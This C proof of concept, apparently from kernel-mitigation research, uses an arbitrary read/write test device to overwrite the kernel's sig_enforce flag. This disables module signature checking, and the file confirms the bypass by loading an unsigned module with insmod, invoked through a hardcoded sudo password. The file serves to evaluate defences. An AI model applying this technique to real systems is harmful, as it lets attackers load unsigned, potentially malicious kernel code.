// FZY: Add a simple proof of concept that overwrites sig_enforce from 1 to 0, allowing unsigned kernel modules to be loaded

#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define FIELD_SIZE 1

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_PRINT_MODINFO _IO('A', 7)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

static bool orig_sig_enforce;

void verify_sig_enforce_addr(int fd, unsigned long sig_enforce_addr) {
  printf("[+] sig_enforce address: 0x%lx\n", sig_enforce_addr);
  
  bool current_value;
  arb_read(fd, sig_enforce_addr, &current_value, FIELD_SIZE);
  printf("[+] Current value: %d\n", current_value);
  orig_sig_enforce = current_value;
}

// The module loaded by the second test stays resident: CONFIG_MODULE_UNLOAD is
// off, so only a reboot removes it.
void restore_sig_enforce(int fd, unsigned long sig_enforce_addr) {
  bool readback;

  arb_write(fd, sig_enforce_addr, &orig_sig_enforce, FIELD_SIZE);
  arb_read(fd, sig_enforce_addr, &readback, FIELD_SIZE);
  if (readback == orig_sig_enforce)
    printf("\n[+] sig_enforce restored to %d\n", orig_sig_enforce);
  else
    printf("\n[-] sig_enforce restore failed, now: %d\n", readback);
}

void overwrite_sig_enforce(int fd, unsigned long sig_enforce_addr) {
  bool new_value = 0;
  printf("[+] Overwriting sig_enforce to %d\n", new_value);
  arb_write(fd, sig_enforce_addr, &new_value, FIELD_SIZE);

  bool verify_value;
  arb_read(fd, sig_enforce_addr, &verify_value, FIELD_SIZE);
  printf("[+] New value: %d\n", verify_value);

  if (verify_value != new_value) {
    printf("[-] Write verification failed! Expected %d but got %d\n", 
           new_value, verify_value);
  } else {
    printf("[+] Successfully overwritten!\n");
  }
}

// The module insmod'd below is an ordinary in-tree module built =m in .config.
// Modules in the build tree are unsigned - CONFIG_MODULE_SIG_ALL only signs at
// 'make modules_install' - so no out of tree build is needed; build.sh copies
// msdos.ko here so its vermagic always matches the running kernel.
#define TEST_MOD_PATH "msdos.ko"
#define TEST_MOD_NAME "msdos"

enum load_result {
  LOAD_REJECTED, // insmod refused the module: sig_enforce is doing its job
  LOAD_OK,       // the module is now resident: the check is gone
  LOAD_ERROR,    // insmod failed for some unrelated reason
};

static bool module_loaded(void) {
  return access("/sys/module/" TEST_MOD_NAME, F_OK) == 0;
}

enum load_result test_module_loading(void) {
  printf("\n[+] Testing module signature enforcement with " TEST_MOD_PATH "\n");

  // CONFIG_MODULE_UNLOAD is off, so a module loaded by an earlier run is still
  // there and insmod would only ever report EEXIST.
  if (module_loaded()) {
    printf("[-] " TEST_MOD_NAME " is already loaded; reboot before rerunning this PoC\n");
    return LOAD_ERROR;
  }

  char out[512] = "";
  FILE *insmod = popen("echo debian | sudo -S insmod " TEST_MOD_PATH " 2>&1", "r");
  if (!insmod) {
    perror("popen insmod");
    return LOAD_ERROR;
  }
  fread(out, 1, sizeof(out) - 1, insmod);
  pclose(insmod);

  if (module_loaded()) {
    printf("[+] Module loaded, signature is not checked, sig_enforce is disabled (value: 0)\n");
    return LOAD_OK;
  }
  if (strstr(out, "Key was rejected by service")) {
    printf("[+] Module rejected, signature is checked, sig_enforce is enforced (value: 1)\n");
    return LOAD_REJECTED;
  }

  printf("[-] insmod failed for an unrelated reason: %s", out);
  return LOAD_ERROR;
}

int main(int argc, char *argv[]) {
  printf("[+] sig_enforce Exploitation PoC\n\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <sig_enforce_addr>\n", argv[0]);
    printf("  mode: 0 (no protection), 1 (Sensitivity Tag), 2 (Sensitivity + TypeID Tag)\n");
    printf("  sig_enforce_addr: nm vmlinux | grep 'sig_enforce'\n");
    return 1;
  }

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open /dev/arb_rw");
    exit(1);
  }
  printf("[+] Opened /dev/arb_rw\n");
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 2) {
    printf("[-] Invalid mode\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long sig_enforce_addr = strtoul(argv[2], NULL, 16);
  
  if (mode != 0) {
    arb_read(arbrw_dev_fd, sig_enforce_addr, &sig_enforce_addr, sizeof(unsigned long));
    printf("[+] sig_enforce address from kernel: 0x%lx\n", sig_enforce_addr);
  
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // sig_enforce_addr = sig_enforce_addr | 0xFFFF000000000000;
  }
  
  verify_sig_enforce_addr(arbrw_dev_fd, sig_enforce_addr);

  enum load_result before = test_module_loading();

  overwrite_sig_enforce(arbrw_dev_fd, sig_enforce_addr);

  enum load_result after = test_module_loading();

  if (before == LOAD_REJECTED && after == LOAD_OK)
    printf("\n[+] Unsigned module load went from rejected to accepted\n");
  else
    printf("\n[-] Module loading did not flip from rejected to accepted\n");

  restore_sig_enforce(arbrw_dev_fd, sig_enforce_addr);

  close(arbrw_dev_fd);
  
  return 0;
}